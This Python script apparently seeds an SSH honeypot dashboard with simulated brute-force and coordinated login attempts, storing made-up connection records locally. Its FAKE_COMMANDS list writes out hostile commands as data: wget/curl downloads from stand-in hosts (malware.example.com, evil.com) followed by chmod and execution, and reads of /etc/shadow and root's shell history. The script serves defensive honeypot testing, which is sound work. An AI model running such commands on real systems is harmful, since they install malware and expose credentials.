"""
Attacker simulator for the SSH Honeypot.

Generates fake connection attempts with realistic patterns so the
dashboard has data to display even without real attackers.

Usage:
    python simulate_attacker.py              # Generate 50 random attempts
    python simulate_attacker.py --count 200  # Generate 200 attempts
    python simulate_attacker.py --brute      # Simulate brute force from one IP
"""

import argparse
import random
import time

from database import init_db, store_connection, store_command
from geo_lookup import lookup_ip


# Realistic attacker IPs (from various countries)
ATTACKER_IPS = [
    "185.220.101.33", "185.220.101.45", "185.234.72.11",
    "103.224.182.5", "103.136.40.22",
    "91.215.85.40", "91.215.85.41",
    "45.33.32.156", "45.55.44.20",
    "46.101.25.80",
    "104.248.50.30",
    "139.59.10.100",
    "178.128.22.10",
    "68.183.100.50",
    "157.245.33.80",
    "77.247.181.162",
    "5.189.160.20",
    "116.203.50.10",
    "165.22.80.40",
    "206.189.140.60",
]

# Common SSH brute force usernames
USERNAMES = [
    "root", "admin", "test", "user", "ubuntu", "oracle", "postgres",
    "mysql", "ftp", "guest", "info", "www", "git", "deploy", "pi",
    "ec2-user", "centos", "vagrant", "docker", "jenkins", "ansible",
    "nagios", "tomcat", "hadoop", "redis", "mongodb", "backup",
]

# Common SSH brute force passwords
PASSWORDS = [
    "123456", "password", "admin", "root", "12345678", "qwerty",
    "abc123", "letmein", "welcome", "monkey", "dragon", "master",
    "1234", "login", "princess", "football", "shadow", "sunshine",
    "trustno1", "iloveyou", "batman", "access", "hello", "charlie",
    "passw0rd", "P@ssw0rd", "admin123", "root123", "test123",
    "password1", "123456789", "1q2w3e4r", "qwerty123",
]

# SSH client banners
CLIENT_BANNERS = [
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
    "SSH-2.0-PuTTY_Release_0.78",
    "SSH-2.0-libssh2_1.10.0",
    "SSH-2.0-paramiko_3.3.1",
    "SSH-2.0-Go",
    "SSH-2.0-JSCH-0.1.54",
    "SSH-2.0-AsyncSSH_2.14.0",
    "",
]

# Fake commands attackers might try
FAKE_COMMANDS = [
    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la",
    "wget http://malware.example.com/bot.sh", "curl -O http://evil.com/miner",
    "chmod +x bot.sh", "./bot.sh", "crontab -l",
    "cat /proc/cpuinfo", "free -m", "df -h",
    "history", "cat /root/.bash_history",
    "iptables -L", "netstat -tlnp",
    "cat /etc/shadow", "passwd root",
]


def simulate_random(count: int = 50) -> None:
    """Generate random connection attempts from various IPs.

    Args:
        count: Number of connections to simulate.
    """
    print(f"[*] Simulating {count} random connection attempts...\n")

    for i in range(count):
        ip = random.choice(ATTACKER_IPS)
        geo = lookup_ip(ip)

        conn_id = store_connection({
            "source_ip": ip,
            "source_port": random.randint(30000, 65535),
            "username": random.choice(USERNAMES),
            "password": random.choice(PASSWORDS),
            "client_banner": random.choice(CLIENT_BANNERS),
            "geo_country": geo["country"],
            "geo_city": geo["city"],
            "session_duration": round(random.uniform(0.5, 15.0), 1),
        })

        # 10% chance of command capture
        if random.random() < 0.10:
            num_cmds = random.randint(1, 5)
            for _ in range(num_cmds):
                store_command(conn_id, random.choice(FAKE_COMMANDS))

        if (i + 1) % 10 == 0:
            print(f"  [{i+1}/{count}] connections generated")

    print(f"\n[+] Done. {count} connections stored in honeypot.db")


def simulate_brute_force(ip: str = "185.220.101.33", attempts: int = 30) -> None:
    """Simulate a brute force attack from a single IP.

    Args:
        ip: Attacker IP address.
        attempts: Number of login attempts.
    """
    geo = lookup_ip(ip)
    print(f"[*] Simulating brute force from {ip} ({geo['country']})...\n")

    banner = "SSH-2.0-libssh2_1.10.0"

    for i in range(attempts):
        store_connection({
            "source_ip": ip,
            "source_port": random.randint(40000, 60000),
            "username": random.choice(["root", "admin", "root", "root"]),
            "password": PASSWORDS[i % len(PASSWORDS)],
            "client_banner": banner,
            "geo_country": geo["country"],
            "geo_city": geo["city"],
            "session_duration": round(random.uniform(0.3, 2.0), 1),
        })

    print(f"[+] Brute force simulation complete. {attempts} attempts from {ip}")


def simulate_coordinated(ips: int = 5, per_ip: int = 10) -> None:
    """Simulate a coordinated attack (shared password list across IPs).

    Args:
        ips: Number of attacker IPs.
        per_ip: Attempts per IP.
    """
    selected_ips = random.sample(ATTACKER_IPS, min(ips, len(ATTACKER_IPS)))
    # Shared password list (same across all IPs = coordinated)
    shared_passwords = random.sample(PASSWORDS, min(per_ip, len(PASSWORDS)))

    print(f"[*] Simulating coordinated attack from {len(selected_ips)} IPs...\n")

    for ip in selected_ips:
        geo = lookup_ip(ip)
        for pwd in shared_passwords:
            store_connection({
                "source_ip": ip,
                "source_port": random.randint(30000, 65535),
                "username": random.choice(["root", "admin"]),
                "password": pwd,
                "client_banner": random.choice(CLIENT_BANNERS),
                "geo_country": geo["country"],
                "geo_city": geo["city"],
                "session_duration": round(random.uniform(0.5, 3.0), 1),
            })

    total = len(selected_ips) * len(shared_passwords)
    print(f"[+] Coordinated attack simulation complete. {total} attempts from {len(selected_ips)} IPs")


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description="Honeypot Attacker Simulator")
    parser.add_argument("--count", "-c", type=int, default=50, help="Number of random connections (default: 50)")
    parser.add_argument("--brute", action="store_true", help="Simulate brute force from one IP")
    parser.add_argument("--coordinated", action="store_true", help="Simulate coordinated attack")
    args = parser.parse_args()

    init_db()

    if args.brute:
        simulate_brute_force()
    elif args.coordinated:
        simulate_coordinated()
    else:
        simulate_random(args.count)


if __name__ == "__main__":
    main()
